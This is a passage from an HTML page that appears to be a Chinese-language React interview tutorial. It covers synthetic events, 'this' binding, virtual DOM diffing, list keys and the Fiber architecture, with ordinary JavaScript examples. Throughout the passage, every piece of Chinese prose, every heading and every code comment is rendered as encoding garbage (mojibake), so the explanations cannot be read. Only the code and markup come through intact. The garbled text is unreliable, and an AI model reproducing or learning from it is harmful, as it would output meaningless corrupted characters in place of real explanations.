17å‰ï¼šnullï¼ˆäº‹ä»¶å¯¹è±¡å·²è¢«å›æ”¶ï¼‰</span><br>  &#125;, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼še.persist() ä¿ç•™äº‹ä»¶å¯¹è±¡</span><br>&#125;<br></code></pre></td></tr></table></figure><p>React 17+ æ”¹è¿›ï¼šç§»é™¤äº†äº‹ä»¶æ± ï¼Œæ— éœ€ e.persist()</p><p><strong>åˆæˆäº‹ä»¶ä¸åŸç”Ÿäº‹ä»¶å·®å¼‚</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">åˆæˆäº‹ä»¶</th><th align="left">åŸç”Ÿäº‹ä»¶</th></tr></thead><tbody><tr><td align="left">äº‹ä»¶æ³¨å†Œ</td><td align="left">onClick</td><td align="left">addEventListener</td></tr><tr><td align="left">äº‹ä»¶å¯¹è±¡</td><td align="left">SyntheticEvent</td><td align="left">åŸç”Ÿ Event å¯¹è±¡</td></tr><tr><td align="left">äº‹ä»¶ä¼ æ’­</td><td align="left">è™šæ‹ŸDOMæ ‘å†’æ³¡</td><td align="left">å®é™…DOMæ ‘å†’æ³¡</td></tr><tr><td align="left">é˜»æ­¢å†’æ³¡</td><td align="left">e.stopPropagation()</td><td align="left">åŒåAPI</td></tr><tr><td align="left">äº‹ä»¶å§”æ‰˜</td><td align="left">è‡ªåŠ¨å§”æ‰˜åˆ°æ ¹å®¹å™¨</td><td align="left">éœ€æ‰‹åŠ¨å§”æ‰˜</td></tr></tbody></table><h3 id="this-ç»‘å®šé—®é¢˜è¯¦è§£ï¼ˆç±»ç»„ä»¶ï¼‰"><a href="#this-ç»‘å®šé—®é¢˜è¯¦è§£ï¼ˆç±»ç»„ä»¶ï¼‰" class="headerlink" title="this ç»‘å®šé—®é¢˜è¯¦è§£ï¼ˆç±»ç»„ä»¶ï¼‰"></a>this ç»‘å®šé—®é¢˜è¯¦è§£ï¼ˆç±»ç»„ä»¶ï¼‰</h3><p><strong>é—®é¢˜æ ¹æº</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Button</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// âŒ æ­¤æ—¶ this ä¸º undefinedï¼ˆä¸¥æ ¼æ¨¡å¼ï¼‰</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>); <br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleClick&#125;</span>&gt;</span>ç‚¹å‡»<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŸå› ï¼šJavaScript å‡½æ•°ä¸­çš„ this ç”±è°ƒç”¨æ–¹å¼å†³å®šï¼Œéç±»å®ä¾‹æœ¬èº«</p><p><strong>å››ç§è§£å†³æ–¹æ¡ˆå¯¹æ¯”</strong></p><table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="left">ä»£ç ç¤ºä¾‹</th><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th></tr></thead><tbody><tr><td align="left">æ„é€ å‡½æ•°ç»‘å®š</td><td align="left">this.handleClick &#x3D; this.handleClick.bind(this)</td><td align="left">æ ‡å‡†åšæ³•</td><td align="left">ä»£ç å†—ä½™</td></tr><tr><td align="left">ç®­å¤´å‡½æ•°ï¼ˆç±»å±æ€§ï¼‰</td><td align="left">handleClick &#x3D; () &#x3D;&gt; {â€¦}</td><td align="left">ç®€æ´ï¼Œæ¨èæ–¹æ¡ˆ</td><td align="left">å®éªŒæ€§è¯­æ³•ï¼ˆéœ€Babelï¼‰</td></tr><tr><td align="left">å†…è”ç®­å¤´å‡½æ•°</td><td align="left">onClick&#x3D;{() &#x3D;&gt; this.handleClick()}</td><td align="left">ç®€å•ç›´æ¥</td><td align="left">æ¯æ¬¡æ¸²æŸ“åˆ›å»ºæ–°å‡½æ•°</td></tr><tr><td align="left">bind å†…è”</td><td align="left">onClick&#x3D;{this.handleClick.bind(this)}</td><td align="left">æ— é¢å¤–ä»£ç </td><td align="left">åŒå†…è”ç®­å¤´å‡½æ•°</td></tr></tbody></table><p><strong>æ€§èƒ½ä¼˜åŒ–å…³é”®ç‚¹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ é¿å…å†…è”ç»‘å®šï¼ˆæ¯æ¬¡æ¸²æŸ“åˆ›å»ºæ–°å‡½æ•°ï¼‰</span><br>&lt;button onClick=&#123;<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleClick</span>(id)&#125;&gt;ç‚¹å‡»&lt;/button&gt;<br><br><span class="hljs-comment">// âœ… æ¨èï¼šæ„é€ å‡½æ•°é¢„ç»‘å®š</span><br><span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>&#125;<br><br><span class="hljs-comment">// âœ… æˆ–ä½¿ç”¨ç±»å±æ€§ç®­å¤´å‡½æ•°</span><br>handleClick = <span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> &#123; ... &#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸è§£å†³æ–¹æ¡ˆ"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸è§£å†³æ–¹æ¡ˆ" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸è§£å†³æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆReactä¸ç›´æ¥ä½¿ç”¨åŸç”Ÿäº‹ä»¶ï¼Ÿ</strong></p><ul><li>è·¨æµè§ˆå™¨å…¼å®¹ï¼šç»Ÿä¸€äº‹ä»¶å¤„ç†é€»è¾‘</li><li>æ€§èƒ½ä¼˜åŒ–ï¼šäº‹ä»¶å§”æ‰˜å‡å°‘å†…å­˜å ç”¨</li><li>äº‹ä»¶æ± æœºåˆ¶ï¼šå¤ç”¨äº‹ä»¶å¯¹è±¡ï¼ˆReact 17å‰ï¼‰</li><li>æ¡†æ¶æ‰©å±•æ€§ï¼šä¸ºå¼‚æ­¥æ¸²æŸ“ç­‰ç‰¹æ€§é“ºå¹³é“è·¯</li></ul><p><strong>Qï¼šå¦‚ä½•é˜»æ­¢åˆæˆäº‹ä»¶çš„é»˜è®¤è¡Œä¸ºï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Form</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    e.<span class="hljs-title function_">preventDefault</span>(); <span class="hljs-comment">// âœ… æ˜¾å¼é˜»æ­¢è¡¨å•æäº¤</span><br>    <span class="hljs-comment">// å¤„ç†é€»è¾‘...</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;handleSubmit&#125;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šåˆæˆäº‹ä»¶å’ŒåŸç”Ÿäº‹ä»¶æ··ç”¨æ—¶è¦æ³¨æ„ä»€ä¹ˆï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleDocumentClick</span>);<br>&#125;<br><br>handleDocumentClick = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// åŸç”Ÿäº‹ä»¶</span><br>&#125;;<br><br>handleButtonClick = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// åˆæˆäº‹ä»¶</span><br>  e.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// âŒ æ— æ³•é˜»æ­¢åŸç”Ÿäº‹ä»¶å†’æ³¡</span><br>&#125;;<br><br><span class="hljs-comment">// âœ… æ­£ç¡®æ–¹æ¡ˆï¼šåœ¨åŸç”Ÿäº‹ä»¶ä¸­ä½¿ç”¨ nativeEvent</span><br>handleButtonClick = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  e.<span class="hljs-property">nativeEvent</span>.<span class="hljs-title function_">stopImmediatePropagation</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="React-17-äº‹ä»¶ç³»ç»Ÿå‡çº§"><a href="#React-17-äº‹ä»¶ç³»ç»Ÿå‡çº§" class="headerlink" title="React 17+ äº‹ä»¶ç³»ç»Ÿå‡çº§"></a>React 17+ äº‹ä»¶ç³»ç»Ÿå‡çº§</h3><ul><li>å§”æ‰˜ç›®æ ‡å˜æ›´ï¼šä» document åˆ° ReactDOM.render çš„æ ¹å®¹å™¨</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React 16ï¼šå§”æ‰˜åˆ° document</span><br><span class="hljs-comment">// React 17+ï¼šå§”æ‰˜åˆ° root DOM å®¹å™¨</span><br><span class="hljs-keyword">const</span> root = <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>));<br>root.<span class="hljs-title function_">render</span>(<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>);<br></code></pre></td></tr></table></figure><ul><li>ç§»é™¤äº‹ä»¶æ± ï¼šæ— éœ€ e.persist() å¯å¼‚æ­¥è®¿é—®äº‹ä»¶å¯¹è±¡</li><li>æ›´æ¥è¿‘åŸç”Ÿï¼še.stopPropagation() çœŸæ­£é˜»æ­¢åŸç”Ÿäº‹ä»¶ä¼ æ’­</li></ul><h1 id="ç¬¬äºŒç« ï¼šReact-æ ¸å¿ƒæœºåˆ¶"><a href="#ç¬¬äºŒç« ï¼šReact-æ ¸å¿ƒæœºåˆ¶" class="headerlink" title="ç¬¬äºŒç« ï¼šReact æ ¸å¿ƒæœºåˆ¶"></a>ç¬¬äºŒç« ï¼šReact æ ¸å¿ƒæœºåˆ¶</h1><h2 id="2-1-è™šæ‹Ÿ-DOM-ä¸-Diff-ç®—æ³•ï¼ˆReconciliationï¼‰"><a href="#2-1-è™šæ‹Ÿ-DOM-ä¸-Diff-ç®—æ³•ï¼ˆReconciliationï¼‰" class="headerlink" title="2.1 è™šæ‹Ÿ DOM ä¸ Diff ç®—æ³•ï¼ˆReconciliationï¼‰"></a>2.1 è™šæ‹Ÿ DOM ä¸ Diff ç®—æ³•ï¼ˆReconciliationï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µæ¦‚è¿°-3"><a href="#åŸºç¡€æ¦‚å¿µæ¦‚è¿°-3" class="headerlink" title="åŸºç¡€æ¦‚å¿µæ¦‚è¿°"></a>åŸºç¡€æ¦‚å¿µæ¦‚è¿°</h3><ul><li>è™šæ‹Ÿ DOM (Virtual DOM)ï¼š<ul><li>JavaScript å¯¹è±¡è¡¨ç¤ºçš„ DOM å‰¯æœ¬</li><li>è½»é‡åŒ–çš„å†…å­˜æ•°æ®ç»“æ„</li><li>ä¸å®é™… DOM ç»“æ„ä¸€ä¸€å¯¹åº”</li></ul></li><li>Diff ç®—æ³• (Reconciliation)ï¼š<ul><li>React æ¯”è¾ƒæ–°æ—§è™šæ‹Ÿ DOM å·®å¼‚çš„ç®—æ³•</li><li>æ—¶é—´å¤æ‚åº¦ä¼˜åŒ–åˆ° O(n)</li><li>ç”Ÿæˆæœ€å°åŒ– DOM æ“ä½œæŒ‡ä»¤</li></ul></li></ul><h3 id="è™šæ‹Ÿ-DOM-æ ¸å¿ƒåŸç†"><a href="#è™šæ‹Ÿ-DOM-æ ¸å¿ƒåŸç†" class="headerlink" title="è™šæ‹Ÿ DOM æ ¸å¿ƒåŸç†"></a>è™šæ‹Ÿ DOM æ ¸å¿ƒåŸç†</h3><p><strong>è™šæ‹Ÿ DOM ç»“æ„ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å®é™… JSX</span><br>&lt;div className=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>Hello React<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">List</span> <span class="hljs-attr">items</span>=<span class="hljs-string">&#123;items&#125;</span> /&gt;</span></span><br>&lt;/div&gt;<br><br><span class="hljs-comment">// å¯¹åº”çš„è™šæ‹Ÿ DOM å¯¹è±¡</span><br>&#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;div&#x27;</span>,<br>  <span class="hljs-attr">props</span>: &#123; <span class="hljs-attr">className</span>: <span class="hljs-string">&#x27;container&#x27;</span> &#125;,<br>  <span class="hljs-attr">children</span>: [<br>    &#123;<br>      <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;h1&#x27;</span>,<br>      <span class="hljs-attr">props</span>: &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;title&#x27;</span> &#125;,<br>      <span class="hljs-attr">children</span>: <span class="hljs-string">&#x27;Hello React&#x27;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-attr">type</span>: <span class="hljs-title class_">List</span>,  <span class="hljs-comment">// ç»„ä»¶ç±»å‹</span><br>      <span class="hljs-attr">props</span>: &#123; items &#125;,<br>      <span class="hljs-comment">// ... å†…éƒ¨æœ‰ç‹¬ç«‹è™šæ‹Ÿ DOM æ ‘</span><br>    &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è™šæ‹Ÿ DOM å·¥ä½œæµç¨‹</strong></p><pre class="mermaid">graph LRA[ç»„ä»¶çŠ¶æ€å˜åŒ–] --> B[åˆ›å»ºæ–°è™šæ‹Ÿ DOM æ ‘]B --> C[Diff ç®—æ³•æ¯”è¾ƒæ–°æ—§æ ‘]C --> D[ç”Ÿæˆ DOM è¡¥ä¸åŒ…]D --> E[æ‰¹é‡æ›´æ–°çœŸå® DOM]</pre><p><strong>è™šæ‹Ÿ DOM æ€§èƒ½ä¼˜åŠ¿</strong></p><table><thead><tr><th align="left">æ“ä½œ</th><th align="left">ç›´æ¥æ“ä½œ DOM</th><th align="left">è™šæ‹Ÿ DOM æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">æ›´æ–° 10 èŠ‚ç‚¹</td><td align="left">10 æ¬¡ DOM æ“ä½œ</td><td align="left">1 æ¬¡ Diff + 1 æ¬¡æ›´æ–°</td></tr><tr><td align="left">è·¨å¹³å°èƒ½åŠ›</td><td align="left">ä¾èµ–æµè§ˆå™¨ API</td><td align="left">æŠ½è±¡æ¸²æŸ“å±‚</td></tr><tr><td align="left">å¤æ‚æ›´æ–°</td><td align="left">æ‰‹åŠ¨ä¼˜åŒ–éš¾åº¦å¤§</td><td align="left">è‡ªåŠ¨æ‰¹é‡å¤„ç†</td></tr></tbody></table><h3 id="Diff-ç®—æ³•æ·±åº¦è§£æï¼ˆO-n-ä¼˜åŒ–ç­–ç•¥ï¼‰"><a href="#Diff-ç®—æ³•æ·±åº¦è§£æï¼ˆO-n-ä¼˜åŒ–ç­–ç•¥ï¼‰" class="headerlink" title="Diff ç®—æ³•æ·±åº¦è§£æï¼ˆO(n) ä¼˜åŒ–ç­–ç•¥ï¼‰"></a>Diff ç®—æ³•æ·±åº¦è§£æï¼ˆO(n) ä¼˜åŒ–ç­–ç•¥ï¼‰</h3><p><strong>ç®—æ³•ä¸‰å¤§è®¾è®¡åŸåˆ™</strong></p><p>(1) åŒçº§æ¯”è¾ƒï¼šåªæ¯”è¾ƒåŒä¸€å±‚çº§çš„èŠ‚ç‚¹ï¼Œä¸è·¨çº§æ¯”è¾ƒ</p><pre class="mermaid">graph TDA[æ—§æ ‘] --> B[èŠ‚ç‚¹A]A --> C[èŠ‚ç‚¹B]D[æ–°æ ‘] --> E[èŠ‚ç‚¹A']D --> F[èŠ‚ç‚¹B']B -->|æ¯”è¾ƒ| EC -->|æ¯”è¾ƒ| F</pre><p>(2) ç±»å‹å·®å¼‚ç›´æ¥æ›¿æ¢ï¼šèŠ‚ç‚¹ç±»å‹ä¸åŒæ—¶ç›´æ¥å¸è½½æ•´æ£µå­æ ‘</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ—§ï¼š&lt;div&gt;&lt;ComponentA /&gt;&lt;/div&gt;</span><br><span class="hljs-comment">// æ–°ï¼š&lt;span&gt;&lt;ComponentB /&gt;&lt;/span&gt;</span><br><span class="hljs-comment">// React æ“ä½œï¼šå¸è½½æ•´ä¸ª div åŠå­ç»„ä»¶ï¼Œåˆ›å»º span å’Œ ComponentB</span><br></code></pre></td></tr></table></figure><p>(3) Key å±æ€§ä¼˜åŒ–åˆ—è¡¨ï¼šåˆ—è¡¨é¡¹ä½¿ç”¨ key æ ‡è¯†èº«ä»½ï¼Œå‡å°‘èŠ‚ç‚¹ç§»åŠ¨å¼€é”€</p><p><strong>åˆ—è¡¨ Diff çš„ key æœºåˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ—§åˆ—è¡¨</span><br>&lt;ul&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span>A<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;b&quot;</span>&gt;</span>B<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;c&quot;</span>&gt;</span>C<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br>&lt;/ul&gt;<br><br><span class="hljs-comment">// æ–°åˆ—è¡¨ï¼ˆåˆ é™¤Bï¼Œæ–°å¢Dï¼‰</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span>A<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;c&quot;</span>&gt;</span>C<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;d&quot;</span>&gt;</span>D<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>Diff è¿‡ç¨‹ï¼š</p><ul><li>é€šè¿‡ key åŒ¹é…æ–°æ—§èŠ‚ç‚¹ï¼šaâ†’a, câ†’c</li><li>åˆ é™¤ key&#x3D;â€bâ€ çš„èŠ‚ç‚¹</li><li>æ–°å¢ key&#x3D;â€dâ€ çš„èŠ‚ç‚¹</li><li>å¤ç”¨ key&#x3D;â€aâ€ å’Œ â€œcâ€ çš„èŠ‚ç‚¹</li></ul><p><strong>èŠ‚ç‚¹å¤ç”¨ç­–ç•¥</strong></p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ“ä½œ</th><th align="left">æ€§èƒ½å½±å“</th></tr></thead><tbody><tr><td align="left">ç›¸åŒç±»å‹ DOM å…ƒç´ </td><td align="left">æ›´æ–°å±æ€§</td><td align="left">é«˜æ•ˆ</td></tr><tr><td align="left">ç›¸åŒç±»å‹ç»„ä»¶å…ƒç´ </td><td align="left">è§¦å‘æ›´æ–°ï¼ˆä¸å¸è½½ï¼‰</td><td align="left">ä¿ç•™ç»„ä»¶çŠ¶æ€</td></tr><tr><td align="left">ä¸åŒç±»å‹å…ƒç´ </td><td align="left">å¸è½½æ•´æ£µå­æ ‘</td><td align="left">æˆæœ¬è¾ƒé«˜</td></tr></tbody></table><h3 id="React-Fiber-æ¶æ„ä¸å¯ä¸­æ–­æ¸²æŸ“"><a href="#React-Fiber-æ¶æ„ä¸å¯ä¸­æ–­æ¸²æŸ“" class="headerlink" title="React Fiber æ¶æ„ä¸å¯ä¸­æ–­æ¸²æŸ“"></a>React Fiber æ¶æ„ä¸å¯ä¸­æ–­æ¸²æŸ“</h3><p><strong>ä¼ ç»Ÿ Diff ç®—æ³•å±€é™</strong></p><ul><li>é€’å½’éå†ï¼šæ— æ³•ä¸­æ–­é•¿æ—¶é—´ä»»åŠ¡</li><li>é˜»å¡ä¸»çº¿ç¨‹ï¼šå¯¼è‡´åŠ¨ç”»å¡é¡¿</li></ul><p><strong>Fiber æ¶æ„æ ¸å¿ƒæ”¹è¿›</strong></p><pre class="mermaid">graph LRA[åŒæ­¥é€’å½’] --> B[å¯ä¸­æ–­å¼‚æ­¥ä»»åŠ¡]C[è™šæ‹ŸDOMæ ‘] --> D[Fiberé“¾è¡¨ç»“æ„]</pre><p>Fiber èŠ‚ç‚¹ç»“æ„ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;div&#x27;</span>,          <span class="hljs-comment">// èŠ‚ç‚¹ç±»å‹</span><br>  <span class="hljs-attr">key</span>: <span class="hljs-literal">null</span>,            <span class="hljs-comment">// å”¯ä¸€æ ‡è¯†</span><br>  <span class="hljs-attr">return</span>: parentFiber,  <span class="hljs-comment">// çˆ¶èŠ‚ç‚¹</span><br>  <span class="hljs-attr">child</span>: firstChild,    <span class="hljs-comment">// ç¬¬ä¸€ä¸ªå­èŠ‚ç‚¹</span><br>  <span class="hljs-attr">sibling</span>: nextSibling, <span class="hljs-comment">// å…„å¼ŸèŠ‚ç‚¹</span><br>  <span class="hljs-attr">alternate</span>: oldFiber,  <span class="hljs-comment">// æŒ‡å‘æ—§æ ‘å¯¹åº”èŠ‚ç‚¹</span><br>  <span class="hljs-attr">effectTag</span>: <span class="hljs-string">&#x27;UPDATE&#x27;</span>,  <span class="hljs-comment">// éœ€è¦æ‰§è¡Œçš„å‰¯ä½œç”¨</span><br>  <span class="hljs-comment">// ... å…¶ä»–å…ƒæ•°æ®</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åŒç¼“å­˜æœºåˆ¶ï¼ˆCurrent æ ‘ä¸ WorkInProgress æ ‘ï¼‰</strong></p><pre class="mermaid">graph LRA[å½“å‰æ˜¾ç¤º] -->|Current æ ‘| B[ç”¨æˆ·ç•Œé¢]C[æ­£åœ¨æ„å»º] -->|WorkInProgress æ ‘| D[å†…å­˜ä¸­]B -->|æ¸²æŸ“å®Œæˆ| C</pre><ul><li>æ— é—ªçƒæ›´æ–°ï¼šç›´æ¥åˆ‡æ¢æ ‘å¼•ç”¨</li><li>å®‰å…¨å›æ»šï¼šä¸­æ–­æ—¶ä¸¢å¼ƒæœªå®Œæˆæ ‘</li></ul><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-1"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-1" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆåˆ—è¡¨æ¸²æŸ“éœ€è¦ keyï¼Ÿkey å¯ä»¥éšæœºæ•°å—ï¼Ÿ</strong></p><ul><li>key å¸®åŠ© React è¯†åˆ«å…ƒç´ èº«ä»½ï¼Œå‡å°‘ä¸å¿…è¦çš„é”€æ¯&#x2F;é‡å»º</li><li>ç¦æ­¢ä½¿ç”¨éšæœºæ•°ï¼šæ¯æ¬¡æ¸²æŸ“ key å˜åŒ–å¯¼è‡´å…¨é‡é‡å»º</li><li>æ¨èæ–¹æ¡ˆï¼šç¨³å®š IDï¼ˆå¦‚æ•°æ® idï¼‰æˆ–ç´¢å¼•ï¼ˆä»…é™æ€åˆ—è¡¨ï¼‰</li></ul><p><strong>Qï¼šè™šæ‹Ÿ DOM ä¸€å®šæ¯”ç›´æ¥æ“ä½œ DOM å¿«å—ï¼Ÿ</strong></p><p>è¾©è¯å›ç­”ï¼š</p><ul><li>åˆå§‹æ¸²æŸ“ï¼šè™šæ‹Ÿ DOM éœ€è¦é¢å¤–åˆ›å»ºå¯¹è±¡ï¼Œç¨æ…¢</li><li>å¤æ‚æ›´æ–°ï¼šè™šæ‹Ÿ DOM é€šè¿‡ Diff å‡å°‘æ“ä½œæ¬¡æ•°ï¼Œæ›´å¿«</li><li>ç»¼åˆä¼˜åŠ¿ï¼š<ul><li>è·¨å¹³å°èƒ½åŠ›ï¼ˆReact Nativeï¼‰</li><li>å£°æ˜å¼ç¼–ç¨‹ä½“éªŒ</li><li>è‡ªåŠ¨æ‰¹å¤„ç†ä¼˜åŒ–</li></ul></li></ul><p><strong>Qï¼šReact å¦‚ä½•å®ç° O(n) å¤æ‚åº¦çš„ 